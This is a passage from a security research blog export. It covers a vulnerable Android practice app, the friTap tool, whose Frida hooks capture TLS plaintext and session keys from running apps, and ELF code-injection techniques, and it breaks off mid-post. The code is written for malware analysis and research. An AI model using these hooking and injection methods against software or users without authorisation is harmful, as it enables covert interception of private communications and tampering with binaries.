b\u0026#39;FETCH\u0026#39;) return self.receive()[3] def exit(self) -\u0026gt; str: self.send(b\u0026#39;\u0026#39;, b\u0026#39;EXIT\u0026#39;) res = self.receive()[3].decode() self.io.close() return res A sample program could look like this:\n... def main(): io = PwnClient(\u0026#39;127.0.0.1\u0026#39;, 8080) print(io.fetch()) io.forward(b\u0026#39;test123\u0026#39;) print(io.fetch()) io.exit() if (__name__ == \u0026#39;__main__\u0026#39;): main() Summary In this post, damnvulnerableapp aka E2VA was presented as an Android app that manages custom vulnerable modules that can be used for vulnerability research on Android OS\u0026rsquo;s. To that end, the modules try to cover different vulnerability classes to allow for discovery of Android - specific difficulities in binary exploitation. In our next post we dive into the first vulnerability and how to exploit it. Stay tuned.\nGetting started E2VA can be downloaded here: https://github.com/fkie-cad/eeva ","permalink":"https://lolcads.github.io/posts/2022/11/diving_into_the_art_of_userspace_exploitation_under_android/","tags":["Android","Binary Exploitation","JNI","E²VA"],"title":"Diving into the art of userspace exploitation under Android - Introducing E²VA (Part 1)"},{"categories":null,"content":"Encryption - a curse and a blessing at the same time Digital communication in today\u0026rsquo;s world has a particularly high status in our society. Financial transactions are conducted via online banking, private communication is increasingly limited to digital messenger services, and even health data is experiencing a shift to digital form. Due to the growth of such sensitive digital data, the need for secure transmission of such data has become increasingly important over the past decades. With the introduction of high-performance and digitally secure cryptographic methods, such as SSL/TLS, today\u0026rsquo;s digital communications are predominantly encrypted. Whereas back then, for example, an attacker could hang himself between the client and the server and read the data traffic without encryption, today all he sees is a jumble of letters. Encryption is truly a boon for protecting sensitive personal data, but it also has its drawbacks, as with almost everything. Encrypted communications negate the ability to analyze communications, which is very relevant when reverse engineering malware or researching vulnerabilities.\nMan-in-the-middle proxy as a solution One of the best known solutions to intercept and decrypt encrypted communications is the so-called \u0026ldquo;man-in-the-middle\u0026rdquo; attack. In this case, the attacker or analyst pretends to be a trustworthy communication partner to the client. However, since the client often does not know how the client\u0026rsquo;s communication partner, referred to hereafter as the server, communicates or behaves, the attacker (or analyst) forwards the communication to the server and pretends to be the client. To establish encrypted communication via TLS, for example, a certificate is required, which the server sends to the client when the connection is established. So a connection is established between the MitM proxy and the client using a MitM certificate (fake certificate) and a connection is established between the MitM proxy and the server using a server certificate. Due to this setup, the communication between client and server is routed through the MitM proxy and can be processed on it without encryption.\nThere are some preventive measures that can prevent such an attack, especially on mobile devices. One of the best known measures is the so-called \u0026ldquo;certificate pinning\u0026rdquo;. This involves storing the expected server certificate or a hash of the certificate in the binary of the client itself. If the client subsequently receives a certificate from the alleged server, this is compared with the embedded certificate or verified by means of a hash value. If this verification is not successful, then the connection is aborted.\nA possible solution to this problem would be to modify the pinning code itself:\nThis approach is possible, but in many cases it is very time-consuming, since the implementations of the pinning can differ greatly depending on the version and the analysis of the code must be performed again for each new version if the pinning is not used from a well known library. In addition, there are, especially with malware, several different implementations of pinning, which is why a general approach often does not lead to the goal.\nOur approach: One thing is certain: in order to get the unencrypted communication, the client application must be \u0026ldquo;attacked\u0026rdquo;. This led us to ask why we don\u0026rsquo;t directly extract the decrypted SSL/TLS stream or the key material from the target appliaction.\nAbstraction of using a library Most applications that perform encrypted communication use a widely available library to do so, such as OpenSSL and NSS. These libraries try to keep the encryption of the data as abstract as possible, so that the use of the library is very convenient. Among other things, they encapsulate the TLS handshake and the sending and receiving of encrypted data.\nA common program flow utilizing a TLS library looks like this:\nThe application wants to establish a secure TLS connection to a server. It uses the TLS library for this purpose, which performs the handshake as shown below:\nAfter establishing the TLS connection, data can now be sent and received using the read and write functions of the TLS library as shown in the figure below.\nExactly these TLS-read and TLS-write functions are used by the target application to read and write the plaintext from TLS stream, respectively. Hence our tool, friTap , is hooking them in order to receive the plaintext of the encrypted packets. Beside this friTap is also able to extract the used TLS keys.\nfriTap usage friTap comes with two operation modes. One is to get the plaintext from the TLS payload as PCAP and the other is to get the used TLS keys. In order to get the decrypted TLS payload we need the -p parameter:\n$ ./friTap.py –m –p decryptedTLS.pcap \u0026lt;target_app\u0026gt; … [*] BoringSSL.so found \u0026amp; will be hooked on Android! [*] Android dynamic loader hooked. [*] Logging pcap to decryptedTLS.pcap The -m paramter indicates that we are analysing a mobile application in the above example. For extracting the TLS keys from a target application we need the -k parameter:\n$ ./friTap.py –m –k TLS_keys.log \u0026lt;target_app\u0026gt; … [*] BoringSSL.so found \u0026amp; will be hooked on Android! [*] Android dynamic loader hooked. [*] Logging keylog file to TLS_keys.log As a result friTap writes all TLS keys to the TLS_keys.log file using the NSS Key Log Format .\nfriTap internals After understanding the overall approach lets dive into the internals of friTap .\nFRIDA friTap is built on the dynamic instrumentation toolkit FRIDA , which allows developers, reverse engineers and security researchers to dynamically analyze and instrument programs. FRIDA allows you to execute Javascript code within the target program, which gives you the ability to hook functions, read and write program memory, execute custom code, and more. A Python API is provided for using FRIDA, which makes it very user-friendly.\nTo accomplish this, FRIDA injects the QuickJS Javascript engine (can also be changed to the V8 runtime ) into the target process and an agent that acts as communication interfaces between the instrumentarized process and its own tool later on. After injection of the engine and the agent, the user is able to execute own Javascript code inside the target process and receive data from it. More on the inner workings of FRIDA can be found here .\nProgram flow A rough overview of the flow of friTap can be seen in the following diagrams, which are explained in more detail in the sections that follow. The first step after loading the friTap JS script into the target process is to identify the operating system (os) of the target process:\nThen an os specific agent will be loaded. This agent enumerates all loaded libraries/modules from the target process. FRIDA provides a function for this purpose that returns for each loaded module its name, base address, size and path in the file system. Based on the name of the modules friTap can identify a SSL/TLS library. Depending on the version and operating system, the name of the loaded module can vary greatly. friTap tries to cover all potential module names of supported libraries as best as possible using expressive regex. The operating system-specific agent determines which libraries are supported and how its hooking is implemented:\nWhen a supported library is detected, friTap tries to hook the SSL-read(), SSL-write() and SSL-keyexport() functions of the respective library and all other functions required for this. Sometimes the target library doesn\u0026rsquo;t provide a key export function, in those cases friTap have to parse the heap in order to find the keys in the memory of the target process.\nNext we want to dive into the implementation details of the mentioned parts of friTap. As mentioned above friTap checks at first on which plattform our target process is running and invoke than its respective os specific agent:\nfunction load_os_specific_agent() { if(isWindows()){ load_windows_hooking_agent() }else if(isAndroid()){ load_android_hooking_agent() }else if(isLinux()){ load_linux_hooking_agent() }else if(isiOS()){ load_ios_hooking_agent() }else if(isMacOS()){ load_macos_hooking_agent() }else{ log(\u0026#34;Error: not supported plattform!\\nIf you want to have support for this plattform please make an issue at our github page.\u0026#34;) } } This agent installs the hooks for the detected libraries. First the enumerations of the supported SSL/TLS libaries are safed (module_library_mapping) and provided for the different hooks. In the following we see how this is done for Android:\nexport function load_android_hooking_agent() { module_library_mapping[plattform_name] = [[/.*libssl_sb.so/, boring_execute],[/.*libssl\\.so/, boring_execute],[/.*libgnutls\\.so/, gnutls_execute],[/.*libwolfssl\\.so/, wolfssl_execute],[/.*libnspr[0-9]?\\.so/,nss_execute], [/libmbedtls\\.so.*/, mbedTLS_execute]]; install_java_hooks(); hook_native_Android_SSL_Libs(module_library_mapping); hook_Android_Dynamic_Loader(module_library_mapping); } If supported, friTap installs java based hooks. Right now these java hooks only installed for Android applications. Next the plattform (operating system) specific hooks are installed. After a supported SSL/TLS library has been found, the search for the corresponding functions (read, write, key export) inside the module is started. This is done using the mapped functions from module_library_mapping. When we have a closer look into the enumerations we can see that for each detected library an appropriate so called \u0026lt;libname\u0026gt;-execute function is mapped. This mapped function contains the implementation details of the SSL-read(), SSL-write() and SSL-keyexport() hooks. Strictly speaking, for each identified library, its platform-specific hook (read, write, export) is installed for the corresponding library. Fortunately, the majority of hooking implementations are platform independent, with only a few platforms having differences. This means that the overall hooking implementation for a specific library is provided by an os independent super class. In the following we see the Android OpenSSL hooking implementation with the implementations inherited from its superclass:\n/* from openssl_boringssl_android.ts */ export class OpenSSL_BoringSSL_Android extends OpenSSL_BoringSSL { constructor(public moduleName:String, public socket_library:String){ super(moduleName,socket_library); } execute_hooks(){ this.install_plaintext_read_hook(); this.install_plaintext_write_hook(); this.install_tls_keys_callback_hook(); } } export function boring_execute(moduleName:String){ var boring_ssl = new OpenSSL_BoringSSL_Android(moduleName,socket_library); boring_ssl.execute_hooks(); } The specific functions of the library are only then hooked in the superclass. This is done by library\u0026rsquo;s specific function names (SSL_read, SSL_write\u0026hellip;) which are passed to our readAddresses() function in order to obtain the addresses for hooking.\n/* super class openssl_boringssl.ts */ export class OpenSSL_BoringSSL { // global variables library_method_mapping: { [key: string]: Array\u0026lt;String\u0026gt; } = {}; addresses: { [key: string]: NativePointer }; ... constructor(public moduleName:String, public socket_library:String,public passed_library_method_mapping?: { [key: string]: Array\u0026lt;String\u0026gt; }){ if(typeof passed_library_method_mapping !== \u0026#39;undefined\u0026#39;){ this.library_method_mapping = passed_library_method_mapping; }else{ this.library_method_mapping[`*${moduleName}*`] = [\u0026#34;SSL_read\u0026#34;, \u0026#34;SSL_write\u0026#34;, \u0026#34;SSL_get_fd\u0026#34;, \u0026#34;SSL_get_session\u0026#34;, \u0026#34;SSL_SESSION_get_id\u0026#34;, \u0026#34;SSL_new\u0026#34;, \u0026#34;SSL_CTX_set_keylog_callback\u0026#34;] this.library_method_mapping[`*${socket_library}*`] = [\u0026#34;getpeername\u0026#34;, \u0026#34;getsockname\u0026#34;, \u0026#34;ntohs\u0026#34;, \u0026#34;ntohl\u0026#34;] } this.addresses = readAddresses(this.library_method_mapping); ... } ... FRIDA provides with the ApiResolver a function enumerateMatches(\u0026quot;exports:\u0026quot; + library_name + \u0026quot;!\u0026quot; + method): This is passed the name of the function, the name of the module and the type (export, import) in a single string. If a match is found, information about this function is returned, of which friTap only needs and stores the address. Below is the whole listing of friTap\u0026rsquo;s readAddresses() function:\n//File: agent/shared/shared_functions.ts /** * Read the addresses for the given methods from the given modules * @param {{[key: string]: Array\u0026lt;String\u0026gt; }} library_method_mapping A string indexed list of arrays, mapping modules to methods * @return {{[key: string]: NativePointer }} A string indexed list of NativePointers, which point to the respective methods */ export function readAddresses(library_method_mapping: { [key: string]: Array\u0026lt;String\u0026gt; }): { [key: string]: NativePointer } { var resolver = new ApiResolver(\u0026#34;module\u0026#34;) var addresses: { [key: string]: NativePointer } = {} for (let library_name in library_method_mapping) { library_method_mapping[library_name].forEach(function (method) { var matches = resolver.enumerateMatches(\u0026#34;exports:\u0026#34; + library_name + \u0026#34;!\u0026#34; + method) var match_number = 0; var method_name = method.toString(); if(method_name.endsWith(\u0026#34;*\u0026#34;)){ method_name = method_name.substring(0,method_name.length-1) } if (matches.length == 0) { throw \u0026#34;Could not find \u0026#34; + library_name + \u0026#34;!\u0026#34; + method } else if (matches.length == 1){ devlog(\u0026#34;Found \u0026#34; + method + \u0026#34; \u0026#34; + matches[0].address) }else{ for (var k = 0; k \u0026lt; matches.length; k++) { if(matches[k].name.endsWith(method_name)){ match_number = k; devlog(\u0026#34;Found \u0026#34; + method + \u0026#34; \u0026#34; + matches[match_number].address) break; } } } addresses[method_name] = matches[match_number].address; }) } return addresses } After all relevant function addresses are available, friTap finally installs the hooks when entering or leaving the respective functions. More on this later.\nIt is possible that a program to be analyzed does not load an SSL/TLS library at program start or loads an SSL/TLS library again at another time. For this case friTap hooks a function in the respective standard library of the operating system. The following is the implementation for Android:\n/* File agent/android/android_agent.ts */ function hook_Android_Dynamic_Loader(module_library_mapping: { [key: string]: Array\u0026lt;[any, (moduleName: string)=\u0026gt;void]\u0026gt; }): void{ ... const regex_libdl = /.*libdl.*\\.so/ const libdl = moduleNames.find(element =\u0026gt; element.match(regex_libdl)) ... let dl_exports = Process.getModuleByName(libdl).enumerateExports() var dlopen = \u0026#34;dlopen\u0026#34; for (var ex of dl_exports) { if (ex.name === \u0026#34;android_dlopen_ext\u0026#34;) { dlopen = \u0026#34;android_dlopen_ext\u0026#34; break } } Interceptor.attach(Module.getExportByName(libdl, dlopen), { onEnter: function (args) { this.moduleName = args[0].readCString() }, onLeave: function (retval: any) { if (this.moduleName != undefined) { for(let map of module_library_mapping[plattform_name]){ let regex = map[0] let func = map[1] if (regex.test(this.moduleName)){ log(`${this.moduleName} was loaded \u0026amp; will be hooked on Android!`) func(this.moduleName) } } } } }) console.log(`[*] Android dynamic loader hooked.`) ... } Now all functions for extracting the streams or the key material should have been identified so that friTap can use the hooks for extracting the plaintext payload or the TLS keys.\nLets dive into the hooking implementations itself. The way of instrumentation varies partly between the different supported libraries and plattform, but all follow the same principle.\nHooking the read function The read functions of the libraries generally have function signature of the following structure:\nint read (void*, void*, int) The first parameter is a pointer to an SSL object that holds all information about the SSL session in use in the background. This object is used to identify the SSL/TLS stream over which data is received. The second parameter is a pointer to a temporary buffer that holds unencrypted data received from the SSL/TLS stream. The third parameter is the maximum number of bytes that can be stored in the buffer for data received from the SSL/TLS stream.\nFor friTap, the second parameter, the buffer containing the unencrypted data, is the important one. To read the contents of this buffer, friTap needs the pointer to it and the number of bytes that were received. FRIDA\u0026rsquo;s interceptor allows to define hooks for function start and end. These callbacks are executed before the execution and after the execution of the function. The callback function for the hook of the function start is passed all parameters of the hooked function. Thus the callback function is able to extract and manipulate all passed parameters. friTap takes advantage of this and extracts from the parameters the second pointer of the read function, which points to the buffer that holds the received, unencrypted data. The implementation is here as an example (using OpenSSL) for the other implementations and it looks like this:\nInterceptor.attach(addresses[\u0026#34;SSL_read\u0026#34;], { onEnter: function (args: any) { var message = getPortsAndAddresses(SSL_get_fd(args[0]) as number, true, addresses) message[\u0026#34;ssl_session_id\u0026#34;] = getSslSessionId(args[0]) message[\u0026#34;function\u0026#34;] = \u0026#34;SSL_read\u0026#34; this.message = message this.buf = args[1] } ... }) The pointer to the buffer is in the paramter array named args, strictly speaking in the second position (it is the second function parameter). This is now saved in the execution context using this.buf = args[1], since the buffer will only be filled with the received data after the read function has been executed.\nThe hook of the function end has exactly one parameter, the return value of the function. In the case of the read function, this is the number of bytes received, which is important for reading the buffer. The hook for the end of the function looks like the following, again demonstrated with OpenSSL as an example:\nInterceptor.attach(addresses[\u0026#34;SSL_read\u0026#34;], { ... onLeave: function (retval: any) { retval |= 0 // Cast retval to 32-bit integer. if (retval \u0026lt;= 0) { return } const buffer_content = this.buf.readByteArray(retval) this.message[\u0026#34;contentType\u0026#34;] = \u0026#34;datalog\u0026#34; send(this.message, buffer_content) } }) retval is the return value of the read function, i.e. the number of bytes received. The previously saved pointer to the buffer can now be read with readByteArray(). By the return value of the read function friTap knows exactly how many bytes have to be read from the buffer. The extracted bytes are then stored in a dictionary object, which in addition to the data also contains information such as port numbers, sender and receiver addresses, etc. . This is then sent via send() from the target process to the main script (python script ), which then processes this information.\nHooking the write function As with the read functions, the write functions have the same function signature for all libraries supported by friTap:\nint write (void*, void*, int) The first parameter is a pointer to an SSL object that holds all information about the SSL session being used in the background. This object is used to identify the SSL/TLS stream over which data is sent. The second parameter is a pointer to a buffer that holds the data to be transmitted, in unencrypted form. The third parameter specifies how many bytes from the referenced buffer should be sent over the associated SSL/TLS stream.\nUnlike the read function, all information necessary for friTap is already available before function execution. The implementation is again exemplified with the implementation of OpenSSL:\nInterceptor.attach(addresses[\u0026#34;SSL_write\u0026#34;], { onEnter: function (args: any) { var message = getPortsAndAddresses(SSL_get_fd(args[0]) as number, false, addresses) message[\u0026#34;ssl_session_id\u0026#34;] = getSslSessionId(args[0]) message[\u0026#34;function\u0026#34;] = \u0026#34;SSL_write\u0026#34; message[\u0026#34;contentType\u0026#34;] = \u0026#34;datalog\u0026#34; const bytesToBeSent = args[1].readByteArray(parseInt(args[2])) send(message, bytesToBeSent) } }) args[1] is the pointer to the buffer, args[2] the number of bytes to send. With readByteArray() the bytes to send can be copied from the buffer. The extracted bytes are then stored in a dictionary object, which contains besides the data also information like port numbers, sender and receiver address etc.. This is then sent via send() from the target process to the main script (Python script), which then processes this information.\nKey extraction In addition to hooking the read and write functions, friTap also provides the ability to export all keys created/received during the handshake. These keys can then be used to decrypt encrypted TLS traffic. Wirehsark provides the ability to specify a keylog file that friTap created when the client connected to the server. The implementation of this functionality varies widely. This is due to the default behavior of the individual libraries, especially depending on the operating system.\nAgain, we would like to show an example, based on the implementation of OpenSSL on linux:\nconst SSL_CTX_set_keylog_callback = ObjC.available ? new NativeFunction(addresses[\u0026#34;SSL_CTX_set_info_callback\u0026#34;], \u0026#34;void\u0026#34;, [\u0026#34;pointer\u0026#34;, \u0026#34;pointer\u0026#34;]) : new NativeFunction(addresses[\u0026#34;SSL_CTX_set_keylog_callback\u0026#34;], \u0026#34;void\u0026#34;, [\u0026#34;pointer\u0026#34;, \u0026#34;pointer\u0026#34;]) const keylog_callback = new NativeCallback(function (ctxPtr, linePtr: NativePointer) { var message: { [key: string]: string | number | null } = {} message[\u0026#34;contentType\u0026#34;] = \u0026#34;keylog\u0026#34; message[\u0026#34;keylog\u0026#34;] = linePtr.readCString() send(message) }, \u0026#34;void\u0026#34;, [\u0026#34;pointer\u0026#34;, \u0026#34;pointer\u0026#34;]) If OpenSSL is selected as a dynamically loaded library, many functions are exported by default. Fortunately, the function SSL_CTX_set_keylog_callback (linux desktop) is also exported. This function gives the user the ability to define a callback function that will be called whenever new key material is generated or received. This function is passed two parameters when it is called: An SSL object associated with the connection and the newly generated or received key material in the form of a string. FRIDA allows you to define your own callback functions, which we did for this use case. friTap creates a new callback function that reads the passed string and stores it in a dictionary object, which is sent to the main script (python script) and processed by it (log or write out).\nIn order to register the own callback, the function SSL_CTX_set_keylog_callback must be called once, before the handshake, with the callback function as parameter. friTap hooks the SSL_new method for this. This function is called before the handshake, but also after the SSL context has been created, i.e. the binding options have already been set so that the callback function can receive the key material of the subsequent handshake.\nFor each operating system, friTap knows the usual library/module and the function that is ultimately responsible for loading the new library. When a new library is loaded into program memory, the name of the new module is checked to see if it matches any of the SSL/TLS library names. If this is the case, the usual read, write and key export functions are hooked.\nSpecial Thanks We like to thank our colleague Max J. Ufer for his initial work in creating friTap. Further we like to thank Martin Lambertz and Jan-Niclas Hilgert for their feedback while working on friTap. Finally we have to thank Ole André Vadla Ravnås for his tireless efforts in the development of FRIDA.\nGetting started friTap can be downloaded here: https://github.com/fkie-cad/friTap ","permalink":"https://lolcads.github.io/posts/2022/08/fritap/","tags":["frida","network","TLS","TLS decryption"],"title":"friTap - Decrypting TLS on the fly"},{"categories":null,"content":"Make Frida Great Again In order to analyse binaries on e.g. Android systems, one is offered a plethora of tools to use to figure out what a binary is doing, whether it is malicious or just buggy. One way to figure out the behaviour of a binary is to utilise the strength of dynamic analysis. Under linux, i.e. Android in particular, Frida is a tool that is used for automated instrumentation of binaries, to inspect memory, function calls etc.\nIn this blog post, I will describe how to overcome a main issue of Frida such that Frida is applicable to a broader set of binaries. For that I will give in-depth explanations on the different techniques being used to solve the issue. Also I will showcase the use of a python library that emerged as a result of this issue.\nStumbling Frida - The Issue Frida internally uses the ptrace - syscall to attach to running processes. Notice that using ptrace requires the CAP_SYS_PTRACE - capability, which is a requirement for tracing arbitrary processes. Thus, an unprivileged user cannot trace e.g. a privileged process. An example is tracing a process on an Android device. If this device is not rooted, then it will not be possible to use ptrace on arbitrary processes.\nLets assume that a user is capable of using ptrace and that user wants to analyse a potentially malicious binary that employs anti-debugging techniques like the following one\nif (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1) { // traced: nice behaviour } else { // not traced: evil behaviour } Then Frida can again not be used to analyse all functionality of the process. This is due to the fact that for each tracee there may at most be one tracer.\nFrida Gadget Of course the developers of Frida are well aware of this issue. Therefore they provide a shared object file called frida-gadget.so (downloaded here ), which is to be injected manually into the target process. There are different kinds of interaction types that specify how the connection between the frida server and the frida client is set up.\nIn the following you can see an example of how to use frida-gadget.so with its default interaction type listen. First, for the target binary:\nLD_PRELOAD=/path/to/frida-gadget.so /path/to/target Now, in order to e.g. trace syscalls that start with \u0026ldquo;read\u0026rdquo;:\nfrida-trace -H 127.0.0.1:27042 -n \u0026#34;Gadget\u0026#34; -i \u0026#34;read*\u0026#34; -H 127.0.0.1:27042: Specifies the frida server to connect to. In this case the server is located on localhost on the default port 27042. -n \u0026ldquo;Gadget\u0026rdquo;: Name of the process to attach to. In this setting, the name of the target process will always be \u0026ldquo;Gadget\u0026rdquo;! -i \u0026ldquo;read*\u0026rdquo;: Specifies what function(s) to trace. Using LD_PRELOAD is not practical in all cases as e.g. it cannot be used to instrument an SUID - binary. For a more general solution, we need another approach.\nELF - based Injection The approach used to make a process load frida-gadget.so at startup is ELF - based injection. In order to support as many platforms as possible, those injection techniques will be based on System V gABI . It describes the abstract structure of an ELF - file, occasionally leaving out details to be specified by a corresponding Processor Supplement (e.g. ARM64 or AMD64 ).\nUnfortunately, it is not possible to fully implement ELF - based injection without using architecture - or OS - dependent information. Thus, the following platform-specific assumptions were made when designing the techniques:\nELF - binary is run on ARM64 and Android: This must currently be ensured, because adjusting virtual addresses and file offsets in the binary enforces patching Relocation Tables , which are highly platform - dependent. There are no other platform - specific tags for .dynamic - entries other than DT_VERSYM DT_VERDEF DT_VERNEED One of the parsers (see Rule of Two ) is build for AMD64 only. Thus the python library will only work on AMD64. Technically, one can try to make sense of the makefiles and change the compilation such that it supports other architectures aswell. ELF - based injection can be split into two (or more) steps:\nCode injection: Insert code into binary, i.e. make it available for internal structures. Code execution: Make injected code executable, i.e. manipulate structures like entry point such that the injected code will be part of the control flow. There is one special technique that cannot be split into two parts: .dynamic - based injection.\nRule of Two The techniques to be explained are implemented in a python library , which mainly uses LIEF . LIEF is a binary parser that among other things supports parsing and manipulating ELF - files. However there is a problem with LIEF, i.e. LIEF desperately tries to keep the binary intact. For that LIEF inserts new memory, shuffles segments around and maybe more when just opening and closing the binary. E.g.\nbinary = lief.parse(\u0026#39;/bin/ls\u0026#39;) binary.write(\u0026#39;./tmp\u0026#39;) will \u0026ldquo;build\u0026rdquo; the binary, i.e. internally calling\nbuilder = lief.ELF.Builder(binary) builder.build() which will insert memory (out of nowhere). One could make the hypothesis that LIEF wants to \u0026ldquo;prepare\u0026rdquo; the binary for future manipulation and thus already allocates enough space to support e.g. quick PHT injections.\nAlso LIEF does not provide all necessary functionality to implement the techniques described in this post. E.g. LIEF does not support overwriting a PHT - entry without modifying the linked memory.\nTo that end, a custom parser is utilised. It supports all necessary functionality that LIEF is lacking or not willing to provide, because it might break correctness. The custom parser, rawelf_injection, takes the name of a binary as an input and performs the requested operations.\nAn issue is that when calling rawelf_injection, LIEF needs to store the current state of the binary to a temporary file and reparse that file after rawelf_injection is done. This will result in references to objects, that are related to the state of a LIEF - binary before storing the binary to a file, being invalid after LIEF reparsed the binary.\nOther problems emerging from using two parsers at the same time will be mentioned throughout the following sections.\nCode Injection Inserting code into the binary can be as easy as just overwriting existing code in .text and as hard as inserting a new segment and a corresponding PHT - entry. Interestingly, not all of the following techniques are applicable in a fixed setting, thus the user of ElfInjection has to know what he/she is doing when performing code injection.\nAs rawelf_injection has been designed w.r.t. the System V gABI, applying it to ELF - files constructed for Android on AARCH64 was assumed to work just out-of-the-box (except for relocations). rawelf_injection has only been tested on Ubuntu 20.04 LTS on AMD64 up to the date I started applying the techniques to ELF - files run on an Android emulator. Lets first look at an overview of the challenges I experienced before diving into the details:\nUnfortunately, it turns out that rawelf_injection does not support platform - independent injection techniques, as OS vendors apparently are allowed to deviate partially from the System V gABI. On the other hand, for different architectures, there are different CPU instructions, like e.g. adrp, that introduce unwanted side effects when inserting new memory.\nSo lets list the challenges and then try to solve them:\nInserting new memory into a binary can invalidate cross - references (e.g. adrp). Loadable segments should not overlap (see linker_phdr.cpp ; user has to ensure that loadables do not overlap) Platform - specific ELF patches (adjust rawelf_injection to AARCH64 processor supplement) Dynamic linker (see .dynsym - based injection for details) Problem with adrp Lets assume we want to inject code into an ARM64 - PIE on Android (API level 31, Pixel 3). Then, using NDK r23b\u0026rsquo;s toolchain (i.e. ndk-build) to compile the program\n#include \u0026lt;stdio.h\u0026gt; ìnt main() { puts(\u0026#34;Hello World!\\n\u0026#34;); return 0; } there will be at least one .plt - entry that handles all calls to puts. The corresponding .plt - stub may look like this:\n$ aarch64-linux-gnu-objdump -j .plt -d hello ... 00000000000006a0 \u0026lt;__libc_init@plt-0x20\u0026gt;: 6a0: a9bf7bf0 stp x16, x30, [sp, #-16]! 6a4: b0000010 adrp x16, 1000 \u0026lt;puts@plt+0x920\u0026gt; 6a8: f944a211 ldr x17, [x16, #2368] 6ac: 91250210 add x16, x16, #0x940 6b0: d61f0220 br x17 ... 00000000000006e0 \u0026lt;puts@plt\u0026gt;: 6e0: b0000010 adrp x16, 1000 \u0026lt;puts@plt+0x920\u0026gt; 6e4: f944ae11 ldr x17, [x16, #2392] 6e8: 91256210 add x16, x16, #0x958 6ec: d61f0220 br x17 Notice that adrp will first compute 0x6e0 + 0x1000 and then zero out the least-significant 12 bits (related to page size). Thus x16 will contain 0x1000. Then x17 will contain the value located at address 0x1000 + 0x958 (i.e. 0x958 = 2392), which is the second to last .got.plt - entry, containing the address of the dynamic linker stub (see address 0x6a0 in objdump - output):\n$ readelf --wide --sections hello [Nr] Name Type Address Off Size ES Flg Lk Inf Al ... [22] .got.plt PROGBITS 0000000000001930 000930 000030 00 WA 0 0 8 ... $ readelf --wide --hex-dump=22 hello ... 0x00001950 a0060000 00000000 a0060000 00000000 ................ Inserting data into the binary can now result in broken references. Lets consider the example that we want to append a new PHT - entry to PHT. Assuming the above platform and build, the PHT is located at\n$ readelf --wide --segments hello Type Offset VirtAddr PhysAddr FileSiz MemSiz Flg Align ... PHDR 0x000040 0x0000000000000040 0x0000000000000040 0x000230 0x000230 R 0x8 ... Appending the PHT - entry will increase the PHDR\u0026rsquo;s size by 0x38, which again will shift everything located after the PHT by 0x38 to the back. Lets consider .plt again\n00000000000006e0 \u0026lt;puts@plt\u0026gt;: 6e0 + 0x38: b0000010 adrp x16, 1000 --\u0026gt; x16 = 0x1000 6e4 + 0x38: f944ae11 ldr x17, [x16, #2392] --\u0026gt; x17 = 0x1000 + 0x958 = 0x1958 6e8 + 0x38: 91256210 add x16, x16, #0x958 --\u0026gt; x16 = 0x1958 6ec + 0x38: d61f0220 br x17 So we will still jump to the same .plt - stub we would jump to, if we did not insert the PHT - entry. In (almost) all cases, this will give you SIGSEG or SIGILL. This is a problem to consider whenever new data is injected into a binary. Despite the fact that we have to take care of unpatchable references, there are also patchable references that can be changed automatically (i.e. using heuristics and math) like e.g. .dynamic entries of tag DT_SYMTAB.\nIn addition to that, if we assumed that we inserted a loadable segment, i.e. a PHT - entry of type PT_LOAD, then the binary might crash with high probability (for me it crashed on every test). Regarding the kernel , loadable segments are allowed to overlap, which coincides with System V gABI (notice the absense of any constraints for segments in comparison to the constraints enforced for sections ). This may lead to the conclusion that either inserting an overlapping loadable segment introduces the same errors regarding adrp as described above, or the dynamic linker contains code that sends a SIGSEG or SIGILL based on a certain condition. As all of the techniques are tested on an Android emulator with the above platform specifications, it could also be that the translator does not like overlapping loadables (/system/bin/ndk_translation_program_runner_binfmt_misc_arm64 is definitely capable of triggering SIGILL!).\nCode Cave - based Injection The first technique described is code injection that relies on finding unused memory between two loadable segments, i.e. segments of type PT_LOAD. For this technique to work properly, we need to consider the following things:\nThis is a segment - based approach, which means that code caves must lie between two loadable segments. Thus a code cave cannot be part of the process image. Assuming we found a code cave, in order to put it into the process image we need to either create a new or overwrite an existing PHT - entry such that it points to the code cave. Or we need to expand one of the surrounding loadable segments. The latter is hard, because loadable segments may theoretically contain other loadable segments. Therefore only \u0026ldquo;top - level\u0026rdquo; loadable segments are used to search for code caves. Segment - based code caves need to be searched for with respect to the file offsets and file sizes of the \u0026ldquo;top - level\u0026rdquo; loadable segments, because the code injection takes place in the file on disk, not at runtime. Again there is a problem, because the size of a segment on disk p_filesz may be strictly less than the size in the process image p_memsz. Appending a code cave to a loadable segment with p_filesz \u0026lt; p_memsz may result in the injected code being overwritten by the application. Also, if combined with a PHT - based injection, one can set the virtual address and memory size to another code cave in process image. System V gABI states that PHT - entries of loadable segments must be sorted ascendingly wrt. their virtual addresses. Therefore the combination of a code cave with overwriting/creating PHT - entries is further limited to the order of PHT - entries. In practice it seems that we can derive from the kernel code that only the first loadable segment needs to have the smallest virtual address s.t. load_bias is correctly set (see also the dynamic linker code responsible for calculating the load_bias for ELF - files loaded by the kernel). There seem to be no checks regarding the order of loadable segments as regards their virtual addresses. Notice that inserting a PHT - entry to point to the code cave will cause all the problems described in Code Injection .\nInjecting code into segment - based code caves is a simple and often stable way to get a binary to execute custom code. Of course seeking code caves can among other things involve analysing control flow to detect \u0026ldquo;dead\u0026rdquo; code in e.g. .text that can be overwritten.\nThe following figure illustrates overwriting an existing PHT - entry such that it points to a segment - based code cave. Segment - based Injection This technique involves everything related to segments that is not already part of code cave - based injection . To be precise, the following subtechniques can be formed:\nOverwrite an existing PHT - entry and overwrite an existing memory region. This is an abstraction of overwriting an existing PHT - entry such that it points to a segment - based code cave. Of course the PHT - entry should point to the overwritten memory, which can be a segment that is not part of the process image or something else. Overwrite an existing PHT - entry and insert new memory to be interpreted as a segment. Inserting new memory will result in problems related to cross - references described in Code Injection . Also this will result in a \u0026ldquo;dead\u0026rdquo; memory region, because the memory region the overwritten PHT - entry was referencing is not interpreted as a segment anymore. Insert a new PHT - entry and overwrite an existing memory region. This is again an abstraction of a code cave - based injection technique, but now arbitrary memory can be interpreted as a segment (notice that the memory region we overwrite is not limited to memory regions between loadable segments as in Code - Cave - based Injection ). Although it can happen that two PHT - entries reference the same memory region. Again note that inserting a new PHT - entry may invalidate cross - references. Finally one can insert a new PHT - entry and a new memory region. As long as one can manage validating cross - references, this technique is the least intrusive one and is even reversible. The following figure depicts inserting a completely new segment: Thinking back to using two parsers , we can see that the \u0026ldquo;mixed\u0026rdquo; techniques are problematic. To be precise, after calling rawelf_injection, LIEF will cause a segmentation fault during its parsing phase. It might be related to the fact that both 